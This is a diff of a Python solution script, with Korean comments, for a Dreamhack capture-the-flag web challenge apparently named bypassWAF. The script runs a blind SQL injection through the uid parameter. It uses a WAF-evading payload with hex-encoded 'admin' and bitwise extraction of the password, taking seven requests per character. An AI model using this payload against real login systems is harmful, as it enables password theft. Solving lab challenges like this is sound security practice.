@@ -2,13 +2,14 @@
 solution..!
 - bypassWAF에 있는 풀이소스..
 - 비트 하나하나를 받아와서 7번의 요청으로 1바이트를 알아낼 수 있는 기법을 사용했다고 함
+- bypassWAF와 Advanced 두개 같이 풀이 가능
 '''
 import requests
 from urllib import parse
 
 s = requests.Session()
 
-url = "http://host3.dreamhack.games:22438/?uid="
+url = "http://host3.dreamhack.games:17922/?uid="
 query = "'||uid=0x61646d696e&&substr(lpad(bin(ascii(substr(upw,{},1))),7,0),{},1)#" 
 '''
 0x61646d696e => admin
@@ -33,11 +34,11 @@ while(1) :
     for j in range(1,8) : 
         res = s.get(url + parse.quote(query.format(i,j)))   # format을 사용해서 i, j 대입. quote -> 특수문자를 문자열로 반환
         print(i,j)
-        if "admin" in res.text :
-            flagbit += 1 << (7 - j) # 
+        if "admin" in res.text : # 1이 나올 경우 admin
+            flagbit += 1 << (7 - j) # 다시 ascii로 변환하기 위해서 2의 제곱을 구해서 다시 더함            
     flag += chr(flagbit) # 아스키코드를 문자열로 다시 변환
     flagbit = 0
     print(flag)
-    if(flag[-1] == "}") :
+    if(flag[-1] == "}") :   # flag 마지막 문자열인 } 인 경우 종료
         break
     i += 1
